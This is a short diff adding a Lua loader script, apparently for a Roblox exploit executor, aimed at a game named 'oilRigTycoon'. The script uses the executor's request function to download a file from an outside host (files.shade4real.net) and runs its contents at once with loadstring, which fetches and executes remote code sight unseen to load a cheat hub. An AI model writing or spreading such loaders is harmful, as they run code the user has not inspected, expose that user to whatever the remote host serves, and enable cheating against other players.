@@ -1,0 +1,6 @@
+if syn then request = syn.request end
+getgenv().script = 'oilRigTycoon'
+local req = request({
+    Url = 'https://files.shade4real.net/shadeHub.txt'
+})
+loadstring(req.Body)()
